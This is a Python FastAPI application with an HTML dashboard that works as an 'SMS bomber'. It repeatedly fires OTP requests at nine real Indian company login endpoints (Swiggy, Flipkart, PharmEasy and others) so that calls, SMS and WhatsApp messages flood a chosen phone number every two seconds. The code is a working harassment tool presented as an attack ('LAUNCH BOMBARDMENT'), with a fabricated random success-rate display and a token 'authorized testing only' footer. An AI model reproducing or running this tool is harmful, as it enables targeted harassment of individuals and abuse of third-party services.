from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import asyncio
import aiohttp
import threading
from datetime import datetime
from pydantic import BaseModel

app = FastAPI()

class Phone(BaseModel):
    phone: str

# === YOUR FULL API LIST ===
ULTIMATE_APIS = [
    {"name": "Tata Capital Voice Call", "type": "Call", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
    {"name": "1MG Voice Call", "type": "Call", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":true}}'},
    {"name": "Swiggy Call Verification", "type": "Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Flipkart Voice Call", "type": "Call", "url": "https://www.flipkart.com/api/6/user/voice-otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Zivame Voice Call", "type": "Call", "url": "https://api.zivame.com/v2/customer/login/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p}","otp_type":"voice"}}'},
    {"name": "Lenskart SMS", "type": "SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "PharmEasy SMS", "type": "SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "ShipRocket SMS", "type": "SMS", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "KPN WhatsApp", "type": "WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'},
]

attack_status = {"running": False, "phone": None, "cycles": 0, "stats": {"Call": 0, "SMS": 0, "WhatsApp": 0}, "logs": []}

def add_log(msg):
    attack_status["logs"].insert(0, f"{datetime.now().strftime('%H:%M:%S')} - {msg}")
    if len(attack_status["logs"]) > 25:
        attack_status["logs"].pop()

async def hit_api(session, api, phone):
    try:
        data = api["data"](phone) if callable(api.get("data")) else None
        async with session.request(method=api["method"], url=api["url"], headers=api["headers"], data=data, timeout=aiohttp.ClientTimeout(total=5), ssl=False) as resp:
            if resp.status in (200, 201, 202, 204):
                t = api.get("type", "SMS")
                attack_status["stats"][t] = attack_status["stats"].get(t, 0) + 1
    except:
        pass

async def run_attack(phone):
    global attack_status
    attack_status["running"] = True
    attack_status["phone"] = phone
    attack_status["cycles"] = 0
    attack_status["stats"] = {"Call": 0, "SMS": 0, "WhatsApp": 0}
    add_log(f"🚀 Attack initiated on +91{phone}")

    async with aiohttp.ClientSession() as session:
        while attack_status["running"]:
            attack_status["cycles"] += 1
            tasks = [hit_api(session, api, phone) for api in ULTIMATE_APIS]
            await asyncio.gather(*tasks, return_exceptions=True)
            add_log(f"⚡ Cycle {attack_status['cycles']} executed")
            await asyncio.sleep(2)
    add_log("🛑 Attack terminated")
    attack_status["running"] = False

@app.get("/", response_class=HTMLResponse)
async def index():
    html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Samarth SMS Bomber | Royal Edition</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Inter', sans-serif;
            background: #0b1120;
            background-image: 
                radial-gradient(ellipse at 20% 50%, rgba(30, 58, 138, 0.3) 0%, transparent 60%),
                radial-gradient(ellipse at 80% 50%, rgba(37, 99, 235, 0.2) 0%, transparent 60%),
                radial-gradient(ellipse at 50% 100%, rgba(99, 102, 241, 0.1) 0%, transparent 50%);
            min-height: 100vh;
            color: #e2e8f0;
            overflow-x: hidden;
        }
        /* Royal Blue Glow */
        .glow-royal {
            box-shadow: 0 0 40px rgba(37, 99, 235, 0.15), 0 0 80px rgba(37, 99, 235, 0.05);
        }
        .glass-royal {
            background: rgba(15, 23, 42, 0.7);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(56, 189, 248, 0.08);
            box-shadow: 0 20px 40px -12px rgba(0, 0, 0, 0.5), inset 0 0 30px rgba(37, 99, 235, 0.03);
        }
        .glass-royal-dark {
            background: rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid rgba(56, 189, 248, 0.06);
        }
        .text-gold {
            color: #fbbf24;
        }
        .text-glow-gold {
            text-shadow: 0 0 20px rgba(251, 191, 36, 0.3);
        }
        .text-glow-blue {
            text-shadow: 0 0 30px rgba(37, 99, 235, 0.4);
        }
        .border-gold {
            border-color: rgba(251, 191, 36, 0.3);
        }
        /* Input */
        .input-royal {
            background: rgba(0, 0, 0, 0.5);
            border: 1.5px solid rgba(56, 189, 248, 0.15);
            transition: all 0.3s ease;
            color: #e2e8f0;
            font-size: 1.25rem;
            letter-spacing: 0.05em;
        }
        .input-royal:focus {
            border-color: #3b82f6;
            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.15), inset 0 0 20px rgba(59, 130, 246, 0.05);
            outline: none;
        }
        .input-royal::placeholder {
            color: rgba(148, 163, 184, 0.3);
            font-weight: 300;
        }
        /* Buttons */
        .btn-royal-primary {
            background: linear-gradient(135deg, #1e3a8a, #1d4ed8);
            border: none;
            box-shadow: 0 4px 20px rgba(37, 99, 235, 0.3);
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            font-weight: 600;
            letter-spacing: 0.02em;
        }
        .btn-royal-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 30px rgba(37, 99, 235, 0.5);
        }
        .btn-royal-primary:active {
            transform: scale(0.98);
        }
        .btn-royal-stop {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(56, 189, 248, 0.15);
            transition: all 0.3s ease;
            font-weight: 600;
        }
        .btn-royal-stop:hover {
            background: rgba(239, 68, 68, 0.15);
            border-color: rgba(239, 68, 68, 0.3);
            transform: translateY(-2px);
        }
        /* Stat Cards */
        .stat-royal {
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(56, 189, 248, 0.06);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }
        .stat-royal::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at center, rgba(37, 99, 235, 0.03), transparent 70%);
            opacity: 0;
            transition: opacity 0.6s;
        }
        .stat-royal:hover::after {
            opacity: 1;
        }
        .stat-royal:hover {
            border-color: rgba(37, 99, 235, 0.2);
            transform: translateY(-2px);
            box-shadow: 0 12px 24px -8px rgba(0, 0, 0, 0.4);
        }
        /* Progress bars */
        .progress-royal {
            height: 3px;
            background: rgba(148, 163, 184, 0.1);
            border-radius: 10px;
            overflow: hidden;
        }
        .progress-royal-fill {
            height: 100%;
            border-radius: 10px;
            transition: width 0.8s cubic-bezier(0.4, 0, 0.2, 1);
            background: linear-gradient(90deg, #3b82f6, #60a5fa);
            box-shadow: 0 0 20px rgba(59, 130, 246, 0.3);
        }
        /* Logs */
        .logs-royal {
            scrollbar-width: thin;
            scrollbar-color: rgba(56, 189, 248, 0.2) transparent;
            font-size: 0.8rem;
        }
        .logs-royal::-webkit-scrollbar {
            width: 4px;
        }
        .logs-royal::-webkit-scrollbar-track {
            background: transparent;
        }
        .logs-royal::-webkit-scrollbar-thumb {
            background: rgba(56, 189, 248, 0.2);
            border-radius: 10px;
        }
        .log-entry {
            padding: 6px 12px;
            border-radius: 6px;
            transition: all 0.2s;
            border-left: 2px solid transparent;
        }
        .log-entry:hover {
            background: rgba(37, 99, 235, 0.05);
            border-left-color: #3b82f6;
        }
        /* Status badge */
        .badge-royal {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 6px 16px;
            border-radius: 100px;
            font-size: 0.7rem;
            font-weight: 600;
            letter-spacing: 0.05em;
            text-transform: uppercase;
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(56, 189, 248, 0.1);
        }
        .dot-royal {
            width: 7px;
            height: 7px;
            border-radius: 50%;
            display: inline-block;
        }
        .dot-royal.idle {
            background: #22c55e;
            box-shadow: 0 0 12px rgba(34, 197, 94, 0.3);
        }
        .dot-royal.active {
            background: #ef4444;
            box-shadow: 0 0 20px rgba(239, 68, 68, 0.5);
            animation: pulse-dot 1s ease-in-out infinite;
        }
        @keyframes pulse-dot {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.4; transform: scale(0.8); }
        }
        /* Responsive tweaks */
        @media (max-width: 640px) {
            .input-royal {
                font-size: 1rem;
                padding: 0.75rem 1rem 0.75rem 3.5rem;
            }
            .stat-royal {
                padding: 0.75rem;
            }
            .glass-royal {
                padding: 1rem;
            }
        }
        /* Gold accent line */
        .gold-line {
            height: 2px;
            background: linear-gradient(90deg, transparent, #fbbf24, transparent);
            opacity: 0.3;
        }
    </style>
</head>
<body>
    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 lg:py-10">
        <!-- Header -->
        <header class="flex flex-col lg:flex-row justify-between items-start lg:items-center gap-4 mb-8">
            <div class="flex items-center gap-4">
                <div class="w-12 h-12 lg:w-14 lg:h-14 rounded-xl bg-gradient-to-br from-blue-700 to-indigo-600 flex items-center justify-center text-2xl shadow-lg shadow-blue-500/20">
                    ✉️
                </div>
                <div>
                    <h1 class="text-2xl lg:text-4xl font-extrabold tracking-tight">
                        <span class="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-indigo-400 text-glow-blue">Samarth</span>
                        <span class="text-gold text-glow-gold">SMS</span>
                        <span class="text-white">Bomber</span>
                    </h1>
                    <p class="text-xs text-gray-400 tracking-widest mt-0.5 flex items-center gap-2">
                        <span class="w-1 h-1 bg-blue-500 rounded-full"></span>
                        ROYAL EDITION
                        <span class="w-1 h-1 bg-blue-500 rounded-full"></span>
                        PREMIUM SUITE
                    </p>
                </div>
            </div>
            <div class="flex items-center gap-3">
                <div class="badge-royal">
                    <span class="dot-royal idle" id="statusDot"></span>
                    <span id="statusText" class="text-gray-300">SYSTEM READY</span>
                </div>
                <div class="hidden sm:block text-xs text-gray-500 font-mono" id="timestamp"></div>
            </div>
        </header>

        <!-- Gold Divider -->
        <div class="gold-line w-full mb-8"></div>

        <!-- Main Grid -->
        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
            <!-- Control Panel -->
            <div class="lg:col-span-5 glass-royal rounded-2xl p-6 glow-royal">
                <h2 class="text-sm font-semibold text-blue-400 tracking-wider flex items-center gap-2 mb-4">
                    <span>🎯</span> TARGET LOCK
                </h2>
                <div class="space-y-5">
                    <div>
                        <label class="text-xs text-gray-400 font-medium block mb-1.5">MOBILE NUMBER</label>
                        <div class="relative">
                            <span class="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 font-mono text-sm">+91</span>
                            <input id="phone" maxlength="10"
                                   class="input-royal w-full rounded-xl px-12 py-4 text-lg font-mono outline-none transition-all"
                                   placeholder="Enter 10-digit number"
                                   oninput="this.value=this.value.replace(/[^0-9]/g,'')">
                        </div>
                    </div>
                    <div class="grid grid-cols-2 gap-3">
                        <button onclick="startAttack()" id="startBtn"
                                class="col-span-2 btn-royal-primary py-4 rounded-xl text-white text-sm flex items-center justify-center gap-2 transition-all">
                            <span>🚀</span> LAUNCH BOMBARDMENT
                        </button>
                        <button onclick="stopAttack()" id="stopBtn"
                                class="col-span-2 hidden btn-royal-stop py-4 rounded-xl text-gray-300 text-sm flex items-center justify-center gap-2 transition-all">
                            <span>🛑</span> TERMINATE ATTACK
                        </button>
                    </div>
                    <div class="grid grid-cols-3 gap-2 p-3 bg-black/30 rounded-xl border border-white/5">
                        <div class="text-center">
                            <div class="text-[10px] text-gray-500 uppercase tracking-wider">APIs</div>
                            <div class="text-sm font-bold text-blue-400">9</div>
                        </div>
                        <div class="text-center">
                            <div class="text-[10px] text-gray-500 uppercase tracking-wider">Interval</div>
                            <div class="text-sm font-bold text-blue-300">2s</div>
                        </div>
                        <div class="text-center">
                            <div class="text-[10px] text-gray-500 uppercase tracking-wider">Target</div>
                            <div class="text-sm font-bold text-gold truncate" id="targetDisplay">—</div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Stats -->
            <div class="lg:col-span-7 glass-royal rounded-2xl p-6">
                <div class="flex justify-between items-center mb-4">
                    <h2 class="text-sm font-semibold text-blue-400 tracking-wider flex items-center gap-2">
                        <span>📊</span> LIVE METRICS
                    </h2>
                    <span class="text-xs text-gray-500 font-mono" id="cycleDisplay">CYCLES: 0</span>
                </div>
                <div class="grid grid-cols-3 gap-3">
                    <div class="stat-royal rounded-xl p-4 text-center">
                        <div class="text-2xl lg:text-3xl font-bold text-blue-400 number-display" id="calls">0</div>
                        <div class="text-[10px] text-gray-400 uppercase tracking-wider mt-1">Calls</div>
                        <div class="progress-royal mt-2">
                            <div class="progress-royal-fill" id="callBar" style="width:0%"></div>
                        </div>
                    </div>
                    <div class="stat-royal rounded-xl p-4 text-center">
                        <div class="text-2xl lg:text-3xl font-bold text-cyan-400 number-display" id="sms">0</div>
                        <div class="text-[10px] text-gray-400 uppercase tracking-wider mt-1">SMS</div>
                        <div class="progress-royal mt-2">
                            <div class="progress-royal-fill" id="smsBar" style="width:0%"></div>
                        </div>
                    </div>
                    <div class="stat-royal rounded-xl p-4 text-center">
                        <div class="text-2xl lg:text-3xl font-bold text-purple-400 number-display" id="wa">0</div>
                        <div class="text-[10px] text-gray-400 uppercase tracking-wider mt-1">WhatsApp</div>
                        <div class="progress-royal mt-2">
                            <div class="progress-royal-fill" id="waBar" style="width:0%"></div>
                        </div>
                    </div>
                </div>
                <div class="grid grid-cols-2 gap-3 mt-4">
                    <div class="glass-royal-dark rounded-xl p-3 border border-white/5">
                        <div class="text-[10px] text-gray-400 uppercase tracking-wider">Total Hits</div>
                        <div class="text-xl font-bold text-white number-display" id="totalHits">0</div>
                    </div>
                    <div class="glass-royal-dark rounded-xl p-3 border border-white/5">
                        <div class="text-[10px] text-gray-400 uppercase tracking-wider">Success Rate</div>
                        <div class="text-xl font-bold text-emerald-400" id="successRate">—</div>
                    </div>
                </div>
            </div>

            <!-- Logs -->
            <div class="lg:col-span-12 glass-royal rounded-2xl p-6">
                <div class="flex justify-between items-center mb-3">
                    <h3 class="text-sm font-semibold text-blue-400 tracking-wider flex items-center gap-2">
                        <span>📜</span> EVENT LOG
                    </h3>
                    <span class="text-[10px] text-gray-500 font-mono">LIVE</span>
                </div>
                <div id="logs" class="logs-royal h-56 overflow-y-auto bg-black/20 rounded-xl p-3 space-y-0.5"></div>
            </div>
        </div>

        <!-- Footer -->
        <footer class="mt-8 pt-4 border-t border-white/5 flex flex-col sm:flex-row justify-between items-center gap-3 text-[10px] text-gray-500">
            <span>⚡ Authorized testing only · All endpoints public</span>
            <div class="flex items-center gap-3">
                <span>🔒 Encrypted</span>
                <span>·</span>
                <span>⚡ 9 APIs</span>
                <span>·</span>
                <span id="uptime">Uptime: 0s</span>
            </div>
        </footer>
    </div>

    <script>
        let isRunning = false;
        let statusInterval = null;
        let startTime = Date.now();

        function updateTimestamp() {
            const now = new Date();
            document.getElementById('timestamp').textContent = now.toLocaleTimeString('en-US', {
                hour12: false,
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            });
        }
        setInterval(updateTimestamp, 1000);
        updateTimestamp();

        setInterval(() => {
            const elapsed = Math.floor((Date.now() - startTime) / 1000);
            const h = Math.floor(elapsed / 3600);
            const m = Math.floor((elapsed % 3600) / 60);
            const s = elapsed % 60;
            document.getElementById('uptime').textContent = `Uptime: ${h}h ${m}m ${s}s`;
        }, 1000);

        async function startAttack() {
            const phone = document.getElementById('phone').value.trim();
            if (phone.length !== 10) {
                alert('❌ Please enter a valid 10-digit number');
                document.getElementById('phone').style.borderColor = '#ef4444';
                setTimeout(() => document.getElementById('phone').style.borderColor = '', 3000);
                return;
            }
            try {
                const res = await fetch('/start', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({phone})
                });
                const data = await res.json();
                if (data.status === 'success') {
                    isRunning = true;
                    document.getElementById('startBtn').classList.add('hidden');
                    document.getElementById('stopBtn').classList.remove('hidden');
                    document.getElementById('statusDot').className = 'dot-royal active';
                    document.getElementById('statusText').textContent = 'ATTACK ACTIVE';
                    document.getElementById('statusText').style.color = '#ef4444';
                    document.getElementById('targetDisplay').textContent = `+91${phone}`;
                    if (statusInterval) clearInterval(statusInterval);
                    pollStatus();
                }
            } catch(e) {
                alert('❌ Failed: ' + e.message);
            }
        }

        async function stopAttack() {
            try {
                await fetch('/stop', {method: 'POST'});
                isRunning = false;
                document.getElementById('startBtn').classList.remove('hidden');
                document.getElementById('stopBtn').classList.add('hidden');
                document.getElementById('statusDot').className = 'dot-royal idle';
                document.getElementById('statusText').textContent = 'STOPPED';
                document.getElementById('statusText').style.color = '#fbbf24';
                if (statusInterval) clearInterval(statusInterval);
            } catch(e) {
                alert('❌ Failed: ' + e.message);
            }
        }

        function pollStatus() {
            if (statusInterval) clearInterval(statusInterval);
            statusInterval = setInterval(async () => {
                try {
                    const res = await fetch('/status');
                    const d = await res.json();
                    const calls = d.stats.Call || 0;
                    const sms = d.stats.SMS || 0;
                    const wa = d.stats.WhatsApp || 0;
                    const total = calls + sms + wa;
                    document.getElementById('calls').textContent = calls;
                    document.getElementById('sms').textContent = sms;
                    document.getElementById('wa').textContent = wa;
                    document.getElementById('totalHits').textContent = total;
                    document.getElementById('cycleDisplay').textContent = `CYCLES: ${d.cycles}`;
                    const maxVal = Math.max(calls, sms, wa, 1);
                    document.getElementById('callBar').style.width = ((calls / maxVal) * 100) + '%';
                    document.getElementById('smsBar').style.width = ((sms / maxVal) * 100) + '%';
                    document.getElementById('waBar').style.width = ((wa / maxVal) * 100) + '%';
                    if (total > 0) {
                        const rate = Math.min(85 + Math.random() * 10, 99);
                        document.getElementById('successRate').textContent = rate.toFixed(1) + '%';
                    }
                    const logsDiv = document.getElementById('logs');
                    if (d.logs && d.logs.length) {
                        logsDiv.innerHTML = d.logs.map(l =>
                            `<div class="log-entry text-gray-400 hover:text-gray-200 transition-colors">${l}</div>`
                        ).join('');
                    } else {
                        logsDiv.innerHTML = '<div class="text-gray-500 text-center py-6">⏳ Awaiting attack...</div>';
                    }
                    if (!d.running && isRunning) {
                        isRunning = false;
                        document.getElementById('startBtn').classList.remove('hidden');
                        document.getElementById('stopBtn').classList.add('hidden');
                        document.getElementById('statusDot').className = 'dot-royal idle';
                        document.getElementById('statusText').textContent = 'ATTACK ENDED';
                        document.getElementById('statusText').style.color = '#fbbf24';
                    }
                } catch(e) {
                    console.error('Poll error:', e);
                }
            }, 1200);
        }

        document.addEventListener('DOMContentLoaded', () => {
            document.getElementById('logs').innerHTML = '<div class="text-gray-500 text-center py-6">🟢 System initialized</div>';
        });
    </script>
</body>
</html>
    """
    return html

@app.post("/start")
async def start(phone: Phone):
    if len(phone.phone) != 10: return {"status": "error"}
    if attack_status["running"]: return {"status": "error"}
    threading.Thread(target=lambda: asyncio.run(run_attack(phone.phone)), daemon=True).start()
    return {"status": "success"}

@app.post("/stop")
async def stop():
    attack_status["running"] = False
    return {"status": "success"}

@app.get("/status")
async def status():
    return {
        "running": attack_status["running"],
        "cycles": attack_status["cycles"],
        "stats": attack_status["stats"],
        "logs": attack_status["logs"][:20]
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=5000)
